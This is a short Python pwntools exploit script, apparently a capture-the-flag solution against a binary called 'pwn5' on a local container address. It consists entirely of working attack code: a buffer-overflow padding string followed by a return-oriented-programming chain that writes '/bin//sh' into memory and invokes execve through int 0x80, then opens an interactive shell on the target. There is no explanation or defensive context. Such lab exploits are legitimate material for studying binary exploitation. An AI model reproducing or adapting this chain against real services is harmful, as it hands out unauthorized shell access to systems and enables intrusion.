from pwn import *

#r = process('./pwn5')
r = remote('172.17.0.2', 4325)
        # Padding goes here
p = '/'*17

p += p32( 0x0806f68a) # pop edx ; ret
p += p32( 0x080eb060) # @ .data
p += p32( 0x080b8836) # pop eax ; ret
p += '/bin'
p += p32( 0x0805501b) # mov dword ptr [edx], eax ; ret
p += p32( 0x0806f68a) # pop edx ; ret
p += p32( 0x080eb064) # @ .data + 4
p += p32( 0x080b8836) # pop eax ; ret
p += '//sh'
p += p32( 0x0805501b) # mov dword ptr [edx], eax ; ret
p += p32( 0x0806f68a) # pop edx ; ret
p += p32( 0x080eb068) # @ .data + 8
p += p32( 0x08049373) # xor eax, eax ; ret
p += p32( 0x0805501b) # mov dword ptr [edx], eax ; ret
p += p32( 0x080481c9) # pop ebx ; ret
p += p32( 0x080eb060) # @ .data
p += p32( 0x080df3bd) # pop ecx ; ret
p += p32( 0x080eb068) # @ .data + 8
p += p32( 0x0806f68a) # pop edx ; ret
p += p32( 0x080eb068) # @ .data + 8
p += p32( 0x08049373) # xor eax, eax ; ret
p += p32( 0x0807aecf) # inc eax ; ret
p += p32( 0x0807aecf) # inc eax ; ret
p += p32( 0x0807aecf) # inc eax ; ret
p += p32( 0x0807aecf) # inc eax ; ret
p += p32( 0x0807aecf) # inc eax ; ret
p += p32( 0x0807aecf) # inc eax ; ret
p += p32( 0x0807aecf) # inc eax ; ret
p += p32( 0x0807aecf) # inc eax ; ret
p += p32( 0x0807aecf) # inc eax ; ret
p += p32( 0x0807aecf) # inc eax ; ret
p += p32( 0x0807aecf) # inc eax ; ret
p += p32( 0x0806d2d7) # int 0x80

r.sendline(p)
r.interactive()
